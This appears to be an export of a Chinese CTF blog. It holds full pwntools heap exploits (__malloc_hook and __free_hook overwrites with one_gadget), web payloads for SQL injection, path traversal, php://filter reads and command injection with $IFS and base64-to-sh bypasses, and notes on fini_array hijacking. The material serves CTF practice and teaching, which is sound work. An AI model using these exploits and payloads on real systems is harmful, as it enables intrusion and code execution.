我们并没有办法篡改got表 但是此时是ubuntu16.04版本环境 我们想到了使用malloc_hook的攻击方法 123libc_addr = addr - (0x7fc2d9938b78-0x7fc2d9574000)malloc_hook = libc_addr+libc.sym[&quot;__malloc_hook&quot;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;] 此时我们再次申请一个大小为0x68的chunk 它会分配到剩下一半的unsortedbin的空间 但是你要注意到 chunk2的指针不是还没被置零吗 chunk2和我们新申请到的chunk指向了同一片空间 这不就可以做到uaf吗 于是我们再次释放chunk2 然后编辑chunk4的内容 覆盖chunk2的fd域 就可以使我们目标地址串连到fastbin上 123add(0x68)#4&amp;2delete(2)edit(4,len(p64(malloc_hook)),p64(malloc_hook-0x23)) 此时我们连续申请两个堆块 第二个堆块就是分配到对应地址的空间 此时我们编辑第二个堆块 覆盖malloc_hook为onegadget地址 这样我们在申请新chunk时系统调用malloc函数时就会调用onegadget 1234567add(0x68)#4 add(0x68)#5 onegadget = 0x4526a+libc_addr #0x45216 0x4526a 0xf02a4 0xf1147payload = cyclic(0x8+0xb)+p64(onegadget)edit(5,len(payload),payload)add(0x30)io.interactive() 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import*context.log_level = &quot;debug&quot;io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25931)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc&quot;)def add(size): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Size:&quot;) io.sendline(str(size)) io.recv()def edit(index,size,payload): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index:&quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content:&quot;) io.sendline(payload)def delete(index): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index:&quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index:&quot;) io.sendline(str(index))add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3payload = cyclic(0x18)+b&quot;\\xe1&quot;edit(0,len(payload),payload)delete(1)add(0x68)#3&amp;1show(2)io.recvuntil(&quot;Content:&quot;)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))libc_addr = addr - (0x7fc2d9938b78-0x7fc2d9574000)malloc_hook = libc_addr+libc.sym[&quot;__malloc_hook&quot;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]add(0x68)#4&amp;2delete(2)edit(4,len(p64(malloc_hook)),p64(malloc_hook-0x23))add(0x68)#4 add(0x68)#5 onegadget = 0x4526a+libc_addr #0x45216 0x4526a 0xf02a4 0xf1147payload = cyclic(0x8+0xb)+p64(onegadget)edit(5,len(payload),payload)add(0x30)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"vscode远程连接","slug":"vscode远程连接","date":"2022-11-13T07:12:44.000Z","updated":"2022-12-06T13:05:08.483Z","comments":true,"path":"2022/11/13/vscode远程连接/","link":"","permalink":"http://example.com/2022/11/13/vscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/","excerpt":"","text":"先把虚拟机需要的环境配置一下 1sudo apt install openssh-server 1sudo apt install curl 接着在物理机上创建一下ssh密匙 1ssh-keygen -t rsa -b 4096 -f %USERPROFILE%/.ssh/debian_rsa 然后自己下载一个vscode 下载后打开 在扩展中搜索remote 安装这个 然后进入到设置里面勾选这个 然后左下角会多出来一个绿色的图标 按图上的点击顺序 选择第一个 然后自行配置 1234Host 名称HostName ip地址User 虚拟机用户名IdentityFile &quot;C:\\Users\\xxxxx\\.ssh\\debian_rsa&quot; //物理机的ssh私匙目录 接着试着连接一下 输入密码后就连接上了虚拟机 但是每次都输入密码太麻烦了 我们之前弄的ssh就是为了免密连接 在虚拟机对应目录下 创建一个文件authorized_keys 接着把物理机中该文件的内容复制到虚拟机刚刚创建的文件中 1C:\\Users\\xxxx\\.ssh\\debian_rsa.pub 然后就可以做到免密连接了","categories":[{"name":"虚拟机","slug":"虚拟机","permalink":"http://example.com/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"tags":[]},{"title":"buu刷题记录","slug":"buu刷题记录","date":"2022-11-11T08:25:44.000Z","updated":"2022-11-24T04:19:42.584Z","comments":true,"path":"2022/11/11/buu刷题记录/","link":"","permalink":"http://example.com/2022/11/11/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","excerpt":"","text":"不打算像pwn一样详细 记录一下自己在buu刷题过程学习的知识点 [极客大挑战 2019]EasySQL 靶机开启后 要求我们输入用户名和密码 这里随便输入后 会发现账号密码都显示在url里 所以可以判断是get传参 这里使用万能密码 1payload = username=&#x27;or&#x27;1&#x27;=&#x27;1&amp;password=admin&#x27;or&#x27;1&#x27;=&#x27;1 先从单引号开始解释 这是由于sql注入的闭合方式 常用闭合方式：单引号&#39;&#39;、双引号&quot;&quot;、括号()、括号+单引号(&#39;&#39;)、多层括号+单引号，例((((((((&#39;&#39;))))))))。另外mysql还可以使用括号+双引号(&quot;&quot;)和多层括号+双引号((((((((&quot;&quot;)))))))) 我们单独输入1’ 判断一下闭合方式 可以发现是单引号闭合 这里解释一下 为什么单引号需要构造成上述payload那样 1select * from table_name where username=&#x27; &#x27; and password=&#x27;&#x27; ; ‘or ‘1’&#x3D;’1 中 第一个引号是用来闭合username&#x3D;’的引号 最后一个引号是用来闭合’and的引号 第二种办法 直接在输入框中手动输入 ‘or 1&#x3D;1 # 这样相当于 1select * from table_name where username=&#x27;1&#x27; or 1=1 # &#x27; and password=&#x27;xxxxxx&#x27; ; 同样可以绕过 [HCTF 2018]WarmUp进入靶机 只有一张滑稽图片 f12查看源代码发现了source.php字样 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; //判断$page是否为空 或者是否为字符串 return false; &#125; if (in_array($page, $whitelist)) &#123; return true; //判断$page是不是白名单里面 &#125; $_page = mb_substr( $page, 0, //mb_strpos表示$page中?是在第几个位置 并返回 mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) //即返回$page？前的字符串 检测是否在白名单内 ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); //对page url解码后再判断一次 $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 还有一个hint.php没看 1flag not here, and flag in ffffllllaaaagggg 推测ffffllllaaaagggg是存储flag的文件 这里使用多个..&#x2F;进行目录穿越来读取flag的值 1/?file=source.php?../../../../../../../../../ffffllllaaaagggg ..&#x2F;可以多用几个 只要超过了ffffllllaaaagggg对应的子目录 [极客大挑战 2019]Havefunf12查看页面源代码 1234567&lt;!-- $cat=$_GET[&#x27;cat&#x27;]; echo $cat; if($cat==&#x27;dog&#x27;)&#123; echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;; &#125;--&gt; 当cat &#x3D; dog的时候输出flag 1payload = cat=dog 这题比较简单 [ACTF2020 新生赛]Include题目直接明说了flag文件的地址 1?file=flag.php 但是我们并没有看到flag 推测flag应该是在源代码中 这里可以利用php:&#x2F;&#x2F;filter伪协议来查看源代码 1?file=php://filter/convert.base64-encode/resource=flag.php #这题payload 1?xxx=php://filter/convert.base64-encode/resource=xxx.php #协议格式 得到了base64编码的flag 1PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NThjOWJmYWEtOThjOC00YTAyLWE3OTUtOTQyNzk1NTg2NDZjfQo= 解码后得到flag 123&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag&#123;58c9bfaa-98c8-4a02-a795-94279558646c&#125; php:&#x2F;&#x2F;filter伪协议作用：php:&#x2F;&#x2F;filter可以获取指定文件源码。当其与文件包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行，从而读取任意文件源代码。 详细解释：https://blog.csdn.net/woshilnp/article/details/117266628 [ACTF2020 新生赛]Exec靶机打开后显示 ping一下本地ip试试 有回显 再输一次 127.0.0.1;ls 12PING 127.0.0.1 (127.0.0.1): 56 data bytesindex.php flag应该在别的目录 127.0.0.1;pwd 12PING 127.0.0.1 (127.0.0.1): 56 data bytes/var/www/html cd &#x2F;查看一下根目录下所有文件 （其实直接find -name flag就好了，但是对方的docker可能没有拷find进去） 12345678910111213141516171819PING 127.0.0.1 (127.0.0.1): 56 data bytesbindevetcflaghomelibmediamntoptprocrootrunsbinsrvsystmpusrvar 看到flag了 但是这里要注意下我们直接cat flag的话 目录并不是根目录 所以这里 cat &#x2F;flag [GXYCTF2019]Ping Ping Ping这题属于是上一题的升级了 1/?ip= 页面显示只有这个 有了上一题的经验 这里直接ip&#x3D;127.0.0.1;ls看一下 123PING 127.0.0.1 (127.0.0.1): 56 data bytesflag.phpindex.php 有一个flag.php cat一下试试 1/?ip= fxck your space! 空格被屏蔽了 猜测是空格绕过 用到$IFS$1 ip&#x3D;127.0.0.1;cat$IFS$1flag.php试一下 1/?ip= fxck your flag! 又被屏蔽了？看一下index.php 究竟屏蔽了哪些关键词 12345678910111213141516171819/?ip=|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;); &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&quot;; print_r($a);&#125;?&gt; flag被屏蔽了 空格也被屏蔽了 base和其他的一些小字符也被屏蔽了 不妨试试编码绕过关键词 我们想要让系统执行的是 1cat$IFS$1flag.php 1Y2F0JElGUyQxZmxhZy5waHA= //base64后 1echo$IFS$1Y2F0JElGUyQxZmxhZy5waHA=|base64$IFS$1-d|sh 但是我们仍然没有看到flag 查看一下页面源代码 发现flag被注释了 12345/?ip=&lt;pre&gt;PING 127.0.0.1 (127.0.0.1): 56 data bytes&lt;?php$flag = &quot;flag&#123;df216e35-445a-444f-ab34-dbfd7735c860&#125;&quot;;?&gt; 尝试一下第二种办法 因为我们发现index.php中有一个变量$a 我们给他赋值g 1a=g;cat$IFS$1fla$a.php 12345/?ip=&lt;pre&gt;PING 127.0.0.1 (127.0.0.1): 56 data bytes&lt;?php$flag = &quot;flag&#123;df216e35-445a-444f-ab34-dbfd7735c860&#125;&quot;;?&gt; 同样可以显示出来 $IFS$IFS默认是空字符(空格Space、Tab、换行\\n)，把相邻的连续的分割符合并到了一起 看一下下面两个例子 123string1=&quot;1 2 3 4&quot;echo $string1echo &quot;$string1&quot; 121 2 3 41 2 3 4 这种情况下 二者输出是一样的 如果我们多增加一个空格呢 IFS就会将其合并后输出 123string2=&quot;1 2 3 4&quot;echo $string2echo &quot;$string2&quot; 121 2 3 41 2 3 4 如果判断是IFS的效果 我们对IFS定义一下再看效果 1234IFS=&#x27;-&#x27;string2=&quot;1 2 3 4&quot;echo $string2echo &quot;$string2&quot; 121 2 3 41 2 3 4 “ “相当于就是屏蔽了IFS [极客大挑战 2019]Secret File打开后查看网页源码 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;style type=&quot;text/css&quot; &gt;#master &#123; position:absolute; left:44%; bottom:0; text-align :center; &#125; p,h1 &#123; cursor: default; &#125;&lt;/style&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;蒋璐源的秘密&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;你想知道蒋璐源的秘密么？&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;想要的话可以给你，去找吧！把一切都放在那里了！&lt;/p&gt; &lt;a id=&quot;master&quot; href=&quot;./Archive_room.php&quot; style=&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;/a&gt; &lt;div style=&quot;position: absolute;bottom: 0;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 发现了一个地址 跟进一下.&#x2F;Archive_room.php 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;style type=&quot;text/css&quot; &gt;#master &#123; position:absolute; left:44%; bottom:20; text-align :center; &#125; p,h1 &#123; cursor: default; &#125;&lt;/style&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;绝密档案&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt; 我把他们都放在这里了，去看看吧 &lt;br&gt; &lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;a id=&quot;master&quot; href=&quot;./action.php&quot; style=&quot;background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;&quot;&gt; &lt;font size=6&gt;SECRET&lt;/font&gt; &lt;/a&gt; &lt;div style=&quot;position: absolute;bottom: 0;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 再次跟进.&#x2F;action.php 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;style&gt; p,h1 &#123; cursor: default; &#125;&lt;/style&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;END&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;查阅结束&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;没看清么？回去再仔细看看吧。&lt;/p&gt; &lt;div style=&quot;position: absolute;bottom: 0;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 提示说跳转的太快没有看清？ 猜测应该是要用到burp抓包 我们返回刚才.&#x2F;Archive_room.php的页面准备抓包 12345678910111213141516HTTP/1.1 302 FoundServer: openrestyDate: Mon, 14 Nov 2022 02:55:48 GMTContent-Type: text/html; charset=UTF-8Connection: closeLocation: end.phpX-Powered-By: PHP/7.3.11Content-Length: 63&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;!-- secr3t.php --&gt;&lt;/html&gt; 发现了一个secr3t.php 跟进看一下 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag放在了flag.php里?&gt;&lt;/html&gt; 目录穿越等办法都禁用了 那么这里用之前学到的php:&#x2F;&#x2F;filter伪协议 1?file=php://filter/convert.base64-encode/resource=flag.php 成功得到了一串base64编码 解密后得到flag 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;FLAG&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt; &lt;?php echo &quot;我就在这里&quot;; $flag = &#x27;flag&#123;6f8af5fd-18ec-4da1-ac03-5975e4d1d176&#125;&#x27;; $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27; ?&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; [ACTF2020 新生赛]BackupFile我们通过查看首页源代码得不到任何想要的信息，此时我们应该想到使用目录扫描来得到我们想要的文件名信息 这里利用dirsearch目录扫描工具 1python dirsearch.py -u http://a90d7c0c-e2a7-4a93-9087-0844df13bce9.node4.buuoj.cn:81 下载文件后打开 1234567891011121314151617&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125;else &#123; echo &quot;Try to find out source file!&quot;;&#125; 这里涉及到的知识点是弱类型比较 12345在==转换字符串的过程中，遵循如下原则： 当字符串开始部分不存在数值的时候，会将该字符串转换为数值 0。如var_dump(&#x27;abc&#x27; == 0)，结果为 True 当字符串开始部分有合法数值的时候，会将该字符串转换为合法数值。如var_dump(&#x27;123abc&#x27; == 123)，结果为True 当字符串中包含 e 或者 E 时，会将其识别为科学计数法。如var_dump(&#x27;0e12asda&#x27; == 0)，结果为True 1payload = key=123 得到flag","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[]},{"title":"ISCTF2022-null","slug":"ISCTF2022-null","date":"2022-11-02T09:21:10.000Z","updated":"2022-11-02T10:27:41.284Z","comments":true,"path":"2022/11/02/ISCTF2022-null/","link":"","permalink":"http://example.com/2022/11/02/ISCTF2022-null/","excerpt":"","text":"看一下保护机制 再拖到ida查看一下main函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+8h] [rbp-8h] v4 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;1.ADD&quot;); puts(&quot;2.CHANGE&quot;); puts(&quot;3.PRINT&quot;); puts(&quot;4.DEL&quot;); putchar(&#x27;:&#x27;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); if ( v3 != 2 ) break; edit(); &#125; if ( v3 &gt; 2 ) &#123; if ( v3 == 3 ) &#123; print(); &#125; else if ( v3 == 4 ) &#123; del(); &#125; else &#123;LABEL_13: puts(&quot;NO CHOICE&quot;); &#125; &#125; else &#123; if ( v3 != 1 ) goto LABEL_13; add(); &#125; &#125;&#125; 菜单题 其他函数没有什么好说的 重点看两个函数 delete和edit 12345678910111213141516unsigned __int64 del()&#123; int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &lt;= 31 ) &#123; free(Page[v1]); Page[v1] = 0LL; Size[v1] = 0; &#125; return __readfsqword(0x28u) ^ v2;&#125; 指针置零了 没有办法UAF 123456789101112131415unsigned __int64 edit()&#123; int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &lt;= 31 &amp;&amp; Page[v1] ) &#123; printf(&quot;Content: &quot;); vuln(Page[v1], Size[v1]); &#125; return __readfsqword(0x28u) ^ v2;&#125; 具体跟进到vuln函数 123456789101112131415161718void __fastcall vuln(_BYTE *a1, int a2)&#123; int v2; // [rsp+14h] [rbp-Ch] if ( a2 &gt; 0 ) &#123; v2 = 0; while ( read(0, a1, 1uLL) == 1 ) &#123; if ( *a1 == &#x27;\\n&#x27; || (++a1, v2 == a2) ) &#123; *a1 = 0; return; &#125; ++v2; &#125; &#125;&#125; 注意这里有一个off by null的漏洞 读入的换行符会被替换成0 首先要泄露libc基址 这里采用unsortedbin泄露基址的办法 但是由于远程靶机的版本是ubuntu18.04 新增了tcache 所以我们要先把tcache填满 前置代码: 1234567891011121314151617181920212223242526272829303132333435from os import lseekfrom pwn import*#io = process(&quot;./null&quot;)io = remote(&quot;120.79.18.34&quot;,20273)libc = ELF(&quot;./libc-2.27.so&quot;)elf = ELF(&quot;./null&quot;)context.log_level = &quot;debug&quot;def add(index,size): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size &quot;) io.sendline(str(size)) io.recvuntil(&quot;OK&quot;)def free(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def edit(index,content): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def print(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) 1234567891011add(0,0x18)#0add(1,0x68)#1add(2,0x68)#2for i in range(3,10): add(i,0xd0)for i in range(3,10): free(i)edit(0,b&#x27;a&#x27;*0x18+b&#x27;\\xe1&#x27;) 我们先申请三个堆块 chunk1和2用来合并成一个fake chunk 这里注意一下后续申请的七个chunk大小 后续gdb动调看一下就很容易明白 这里可以看到 chunk1和chunk2已经合并成了一个0xe1大小的堆块 我们具体查看一下当前chunk的内容 可以看到是因为刚才的edit改变了chunk1的size大小 接着我们free一下chunk1 此时由于tcache已经被填满了 所以chunk1就会被释放到unsortedbin 由于其机制 所以此时fd和bk都会指向main_arena+0x??的地址 通过再次申请一个chunk 再调用print函数 就可以打印出我们需要的地址 此时再计算偏移 就可以求出基址 123free(1)add(10,0x68)print(10) 我们逐步拆分一下这一层的操作 首先是执行完free 成功划入unsortedbin 再申请一个大小为0x68的chunk(只申请一半 是为了接下来的double free做铺垫) 跟进看一下新申请的chunk的内容 这里你会发现两个的chunk fd和bk差了208 这正是0xd0的十进制 但是这并不妨碍我们计算基址 记录下此时动调的fd值 在gdb中我们输入vmmap libc查看一下当前程序运行的libc基址 然后求出偏移 虽然程序每次运行的libc基址和我们泄露出来的main_arena地址都会变化 但是这个偏移值是固定的 12libc_addr = main_arena_addr - offsetoffset = 0x7fa1d8fa7d70 - 0x7fa1d8bbc000 基址出来以后 one_gadget和free_hook以及system的地址都可以求出来了 由于程序开启了FULL RELRO保护 我们不能篡改free函数的got表 但是我们可以修改free_hook函数的got表 这里可以应用double free的办法来把free_hook的函数地址放到tcache链上 先把计算基址和一些必要的数据的exp放出来 123456789print(10)free_got = elf.got[&#x27;free&#x27;]io.recvuntil(&quot;Content: &quot;)main_arean = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))libc_addr = main_arean -(0x7f91b42a5d70-0x7f91b3eba000)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))onegadget_addr = libc_addr + 0x4f302free_hook = libc.symbols[&#x27;__free_hook&#x27;]+libc_addr 此时我们再次申请一个大小为0x68的chunk 你会发现 这个chunk的指针和我们之前申请的chunk2是共享的 所以我们可以先free chunk2 再编辑chunk11的内容 此时你会发现我们编辑进chunk11的内容会被串连到bin链上 123add(11,0x68)free(2)edit(11,p64(free_hook)) 此时我们再申请一个chunk 就会取出bin中第一个chunk 再取出一个 就会获得指向free_hook的chunk 此时我们编辑该chunk的内容 就相当于像free_hook中写入任意 最终exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from os import lseekfrom pwn import*io = process(&quot;./null&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)elf = ELF(&quot;./null&quot;)context.log_level = &quot;debug&quot;def add(index,size): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size &quot;) io.sendline(str(size)) io.recvuntil(&quot;OK&quot;)def free(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def edit(index,content): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def print(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))add(0,0x18)#0add(1,0x68)#1add(2,0x68)#2for i in range(3,10): add(i,0xd0)for i in range(3,10): free(i)edit(0,b&#x27;a&#x27;*0x18+b&#x27;\\xe1&#x27;)free(1)add(10,0x68)print(10)free_got = elf.got[&#x27;free&#x27;]io.recvuntil(&quot;Content: &quot;)main_arean = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))libc_addr = main_arean -(0x7f91b42a5d70-0x7f91b3eba000)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))onegadget_addr = libc_addr + 0x4f302free_hook = libc.symbols[&#x27;__free_hook&#x27;]+libc_addr add(11,0x68)free(2)edit(11,p64(free_hook))add(12,0x68)add(13,0x68)edit(13,p64(onegadget_addr))free(13)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"fini劫持","slug":"fini劫持","date":"2022-10-12T08:05:30.000Z","updated":"2022-10-12T08:25:57.046Z","comments":true,"path":"2022/10/12/fini劫持/","link":"","permalink":"http://example.com/2022/10/12/fini%E5%8A%AB%E6%8C%81/","excerpt":"","text":"基础概念 一个程序在执行的时候 其并不是直接执行main函数 先是执行入口函数 入口函数对运行库和程序运行环境进行初始化，包括堆、I&#x2F;O、线程、全局变量的构造等等 在完成初始化之后，调用main函数，正式开始执行函数主体部分 main函数执行完毕之后，返回到入口函数，入口函数进行清理工作，包括全局变量析构、堆销毁、关闭I&#x2F;O等，然后进行系统调用结束进程 这里不具体到各个入口函数的区别 因为属于概念问题 理解起来不会有难度 可以自行查阅wiki 总之 如果只是为了做题而记忆 可以按下面理解 在静态编译下bss段中会存放一个fini数组 在main函数结束后 程序指向了fini函数 其会先跳转到fini[1]存放的地址 接着返回fini[0]存放的地址 所以我们只需要将fini[1]修改为我们想要控制执行流的地方 再把fini[0]修改成fini函数 程序就会陷入死循环 重复的执行fini[1]指向的地址 动态编译下 fini数组不会存储在bss段中 并且也只有一个字长 (不知道是不是我遇到的这题的特殊情况) 直接将这个地址的值覆盖成要重复执行的函数地址就行了 不过在我遇到的这题中好像就只能跳转一次 